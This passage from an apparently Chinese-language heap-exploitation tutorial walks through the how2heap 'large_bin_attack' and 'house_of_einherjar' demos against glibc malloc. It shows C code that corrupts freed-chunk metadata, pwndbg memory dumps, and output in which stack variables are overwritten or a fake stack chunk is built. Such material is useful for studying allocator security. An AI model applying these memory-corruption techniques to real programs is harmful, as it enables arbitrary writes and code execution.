class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>接下来申请一块比释放的第一块 chunk 稍小的 chunk：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">        <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">        <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">        <span class="string">&quot; [ %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)p1 + <span class="number">0x90</span>));</span><br></pre></td></tr></table></figure>
<p>在这个过程中，第二块释放的 large chunk 会被移入 large bin，并且会用释放的第一块 large chunk 空间进行分配，剩下的部分仍会被放入 unsorted bin 中。</p>
<p>整理的过程如下所示，需要注意的是 large bins 中 chunk 按 fd 指针的顺序从大到小排列，如果大小相同则按照最近使用顺序排列：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//This technique is taken from</span></span><br><span class="line"><span class="comment">//https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//[...]</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          bck = fwd-&gt;bk;</span><br><span class="line"></span><br><span class="line"><span class="comment">//[...]</span></span><br><span class="line"></span><br><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="comment">//For more details on how large-bins are handled and sorted by ptmalloc,</span></span><br><span class="line"><span class="comment">//please check the Background section in the aforementioned link.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//[...]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>堆的数据如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6030a0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400: 0x603360 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x603360 &#x2F;* &#39;&#96;3&#96;&#39; *&#x2F;</span><br><span class="line">pwndbg&gt; p p1</span><br><span class="line">$1 &#x3D; (unsigned long *) 0x603010</span><br><span class="line">pwndbg&gt; p p2</span><br><span class="line">$2 &#x3D; (unsigned long *) 0x603370</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 161, </span><br><span class="line">  fd &#x3D; 0x7ffff7dd1e98 &lt;main_arena+888&gt;, </span><br><span class="line">  bk &#x3D; 0x7ffff7dd1e98 &lt;main_arena+888&gt;, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6030a0 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 657, </span><br><span class="line">  fd &#x3D; 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk &#x3D; 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603330 &#123;</span><br><span class="line">  prev_size &#x3D; 656, </span><br><span class="line">  size &#x3D; 48, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来 free large chunk 3。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(p3);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">       <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="keyword">void</span> *)(p3 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p3[<span class="number">0</span>]));</span><br></pre></td></tr></table></figure>
<p>它会被插入到 unsorted bin 中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p p3</span><br><span class="line">$3 &#x3D; (unsigned long *) 0x6037b0</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x6037a0 —▸ 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6037a0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400: 0x603360 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x603360 &#x2F;* &#39;&#96;3&#96;&#39; *&#x2F;</span><br></pre></td></tr></table></figure>
<p>接下来假设有栈堆溢出，可以覆盖第二块 large chunk 的 size 和 bk、bk_nextsize 指针。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">        <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">        <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">        <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br></pre></td></tr></table></figure>
<p>我们减少释放的第二块 large chunk 的 size 以迫使 malloc 插入释放的位于 large bin freelist 首部的第三块 large chunk。</p>
<p>为了覆盖栈上的变量，我们将 bk 指向 stack_var1 的 16 bytes 前，bk_nextsize 指向 stack_var2 的 32 bytes 前：</p>
<p>修改前：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p p2</span><br><span class="line">$4 &#x3D; (unsigned long *) 0x603370</span><br><span class="line">pwndbg&gt; x&#x2F;20xg p2-2</span><br><span class="line">0x603360:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x603370:	0x00007ffff7dd1f68	0x00007ffff7dd1f68</span><br><span class="line">0x603380:	0x0000000000603360	0x0000000000603360</span><br><span class="line">0x603390:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>修改后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;stack_var1 </span><br><span class="line">$6 &#x3D; (unsigned long *) 0x7fffffffdc70</span><br><span class="line">pwndbg&gt; p &amp;stack_var2 </span><br><span class="line">$7 &#x3D; (unsigned long *) 0x7fffffffdc78</span><br><span class="line">pwndbg&gt; x&#x2F;20xg p2-2</span><br><span class="line">0x603360:	0x0000000000000000	0x00000000000003f1      &lt;-- fake p2 [be freed]</span><br><span class="line">0x603370:	0x0000000000000000	0x00007fffffffdc60      &lt;-- fd, fake bk</span><br><span class="line">0x603380:	0x0000000000000000	0x00007fffffffdc58      &lt;--     fake bk_nextsize</span><br><span class="line">0x603390:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033f0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x6037a0 —▸ 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6037a0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400 [corrupted]</span><br><span class="line">FD: 0x603360 ◂— 0x0</span><br><span class="line">BK: 0x603360 —▸ 0x7fffffffdc60 ◂— 0x0</span><br></pre></td></tr></table></figure>
<p>接下来再次 malloc：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">        <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br></pre></td></tr></table></figure>
<p>被释放的第三块 large chunk 会被插入 large bin list 中。</p>
<p>这个过程中判断条件会进入上面整理过程的 else 分支中。判断条件是 <code>(unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)</code>。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br></pre></td></tr></table></figure>
<p>其中 fwd 是 fake p2，victim 是 p3，bck 会被赋值为 <code>&amp;stack_var1 - 2</code>。</p>
<p>在 p3 被放回 large bin 并排序的过程中，我们让位于栈上的两个变量也被修改成了 victim。对应的语句分别是 <code>bck-&gt;fd = victim;</code> 和 <code>ictim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xg p3-2</span><br><span class="line">0x6037a0:	0x0000000000000000	0x0000000000000411</span><br><span class="line">0x6037b0:	0x0000000000603360	0x00007fffffffdc60</span><br><span class="line">0x6037c0:	0x0000000000603360	0x00007fffffffdc58</span><br><span class="line">0x6037d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6037e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">pwndbg&gt; p&#x2F;x stack_var1</span><br><span class="line">$11 &#x3D; 0x6037a0</span><br><span class="line">pwndbg&gt; p&#x2F;x stack_var2</span><br><span class="line">$12 &#x3D; 0x6037a0</span><br></pre></td></tr></table></figure>
<h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;glibc_2.25&#x2F;large_bin_attack</span><br><span class="line">This file demonstrates large bin attack by writing a large unsigned long value into stack</span><br><span class="line">In practice, large bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attack</span><br><span class="line"></span><br><span class="line">Let&#39;s first look at the targets we want to rewrite on stack:</span><br><span class="line">stack_var1 (0x7fffffffdcc0): 0</span><br><span class="line">stack_var2 (0x7fffffffdcc8): 0</span><br><span class="line"></span><br><span class="line">Now, we allocate the first large chunk on the heap at: 0x603000</span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the free()</span><br><span class="line"></span><br><span class="line">Then, we allocate the second large chunk on the heap at: 0x603360</span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the free()</span><br><span class="line"></span><br><span class="line">Finally, we allocate the third large chunk on the heap at: 0x6037a0</span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the free()</span><br><span class="line"></span><br><span class="line">We free the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x603360 &lt;--&gt; 0x603000 ]</span><br><span class="line"></span><br><span class="line">Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x6030a0 ]</span><br><span class="line"></span><br><span class="line">Now, we free the third large chunk and it will be inserted in the unsorted bin: [ 0x6037a0 &lt;--&gt; 0x6030a0 ]</span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the freed second large chunk&#39;s &quot;size&quot; as well as its &quot;bk&quot; and &quot;bk_nextsize&quot; pointers</span><br><span class="line">Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk at the head of the large bin freelist. To overwrite the stack variables, we set &quot;bk&quot; to 16 bytes before stack_var1 and &quot;bk_nextsize&quot; to 32 bytes before stack_var2</span><br><span class="line"></span><br><span class="line">Let&#39;s malloc again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:</span><br><span class="line">stack_var1 (0x7fffffffdcc0): 0x6037a0</span><br><span class="line">stack_var2 (0x7fffffffdcc8): 0x6037a0</span><br></pre></td></tr></table></figure>
<h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h2><p>Exploiting a single null byte overflow to trick malloc into returning a controlled pointer</p>
<blockquote>
<p>house of einherjar 是一种堆利用技术，由 Hiroki Matsukuma 提出。该堆利用技术可以强制使得 malloc 返回一个几乎任意地址的 chunk 。<br>它要求有一个单字节溢出漏洞，覆盖掉 next chunk 的 size 字段并清除 PREV_IN_USE 标志，然后还需要覆盖 prev_size 字段为 fake chunk 的大小。</p>
</blockquote>
<h3 id="解释-4"><a href="#解释-4" class="headerlink" title="解释"></a>解释</h3><p>首先我们申请一个 chunk</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27;\n&quot;</span>);</span><br><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">   <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: %#x\n&quot;</span>, real_a_size);</span><br></pre></td></tr></table></figure>
<p>为了覆盖 a，我们还需要知道对齐之后 a 的真实大小。</p>
<p>接下来构造一块 fake chunk：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// create a fake chunk</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWe create a fake chunk wherever we want, in this case we&#x27;ll create the chunk on the stack\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;(although we could do the unsafe unlink technique here in some scenarios)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">fake_chunk[<span class="number">2</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">fake_chunk[<span class="number">3</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">fake_chunk[<span class="number">4</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">fake_chunk[<span class="number">5</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">5</span>]);</span><br></pre></td></tr></table></figure>
<p>我们可以在任意地方创建 fake chunk，在这里我们在栈上创建。只要你知道它的地址，你也可以在堆上或 bss 段上创建 fake chunk。</p>
<p>虽然某些情况下我们也可以执行 unsafe unlink，但是这里我们让 fwd 和 bck 指针都指向 fake chunk 以通过 unlink 的检查。</p>
<p>输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Our fake chunk at 0x7fffffffdc50 looks like:</span><br><span class="line">prev_size (not used): 0x100</span><br><span class="line">size: 0x100</span><br><span class="line">fwd: 0x7fffffffdc50</span><br><span class="line">bck: 0x7fffffffdc50</span><br><span class="line">fwd_nextsize: 0x7fffffffdc50</span><br><span class="line">bck_nextsize: 0x7fffffffdc50</span><br></pre></td></tr></table></figure>
<p>查看内存：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p&#x2F;x fake_chunk </span><br><span class="line">$1 &#x3D; &#123;0x100, 0x100, 0x7fffffffdc50, 0x7fffffffdc50, 0x7fffffffdc50, 0x7fffffffdc50&#125;</span><br></pre></td></tr></table></figure>
<p>也和我们的预期值相符。</p>
<p>在未来 free 掉 next chunk 时，让合并的堆块到 fake chunk 处，下一次 malloc 将返回我们想要的地址。</p>
<p>接下来 malloc 一个 chunk。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment"> * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment"> * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br></pre></td></tr></table></figure>
<p>接下来我们假设有一个堆溢出漏洞，它会修改 chunk b 的 prev_inuse 位，这样 malloc 会认为 b 之前的 chunk 是空闲的。</p>
